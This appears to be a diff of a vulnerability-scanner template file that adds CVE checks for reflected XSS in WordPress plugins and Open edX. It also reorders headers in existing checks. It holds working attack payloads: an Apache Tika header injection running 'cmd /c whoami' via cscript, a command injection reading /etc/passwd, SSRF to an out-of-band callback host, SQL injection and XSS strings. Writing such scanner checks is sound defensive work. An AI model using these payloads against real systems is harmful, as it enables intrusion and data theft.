@@ -6462,11 +6462,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript"
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -9890,8 +9890,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Atlassian-Token": "no-check"
+            "X-Atlassian-Token": "no-check",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -11272,8 +11272,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Referer": "{{Hostname}}/module/login/login.html"
+            "Referer": "{{Hostname}}/module/login/login.html",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -14635,6 +14635,21 @@
           "path": [
             "{{BaseURL}}/wp-content/plugins/elementor/assets/js/frontend.min.js",
             "{{BaseURL}}/#elementor-action:action=lightbox&settings=eyJ0eXBlIjoibnVsbCIsImh0bWwiOiI8c2NyaXB0PmFsZXJ0KCd4c3MnKTwvc2NyaXB0PiJ9"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-24910",
+      "info": {
+        "name": "Transposh WordPress < 1.0.7 - Reflected Cross-Site Scripting (XSS)",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-admin/admin-ajax.php?action=tp_tp&e=g&m=s&tl=en&q=<img%20src%3dx%20onerror%3dalert(document.domain)>"
           ]
         }
       ]
@@ -18362,6 +18377,21 @@
       ]
     },
     {
+      "id": "CVE-2022-0599",
+      "info": {
+        "name": "The Mapping Multiple URLs Redirect Same Page WordPress plugin through 5.8 - Reflected XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1\n",
+            "GET /wp-admin/admin.php?page=mmursp-list&view=edit&mmursp_id=\"><svg/onload=alert(document.domain)> HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-0653",
       "info": {
         "name": "Wordpress Profile Builder Plugin Cross-Site Scripting",
@@ -19956,6 +19986,21 @@
           "raw": [
             "POST /admin/ajax.php?action=login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername={{username}}&password={{password}}\n",
             "GET /admin/manage_user.php?id=-1%20union%20select%201,md5({{num}}),3,4,5--+ HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-32159",
+      "info": {
+        "name": "Open edX - Cross-site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/logout?next=%208%22onmouseover=%22alert(document.domain)"
           ]
         }
       ]
